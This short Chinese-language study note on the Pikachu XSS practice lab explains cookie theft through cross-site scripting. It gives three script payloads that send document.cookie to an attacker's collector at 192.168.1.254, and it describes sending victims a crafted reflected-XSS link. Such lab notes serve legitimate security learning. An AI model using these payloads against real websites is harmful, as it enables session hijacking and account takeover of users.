xss平台

根据微软Secure Windows Initiative小组的高级安全项目经理Michael Howard的说法，大多数XSS攻击的目的都是盗窃cookie。

获取用户的cookie然后发送到xss后台
可以使用pikachu自带的xss后台 也可以搭建自己的xss后台 github上有开源的


<script>document.location='http://192.168.1.254/pikachu/pkxss/xcookie/cookie.php?cookie='+document.cookie;</script>

<script>document.location = 'http://192.168.1.254/pikachu/pkxss/xcookie/cookie.php?cookie=' + document.cookie;</script>

<script>document.location='http://192.168.1.254/pkxss/xcookie/cookie.php?cookie='+document.cookie;</script>


Pikachu-XSS漏洞之cookie值获取、钓鱼结果和键盘记录实战记录
https://www.cnblogs.com/li2019/p/12650512.html

一开始觉得这种反射型的xss有啥用？
后来一想就明白了 反射性的xss有get/post的
对于get类型的 我们可以给受害者发送一个链接啊 
恶意的xss就存放在这个链接里面 然后受害者点击之后 他的cookie就会发送到攻击者的服务器上了

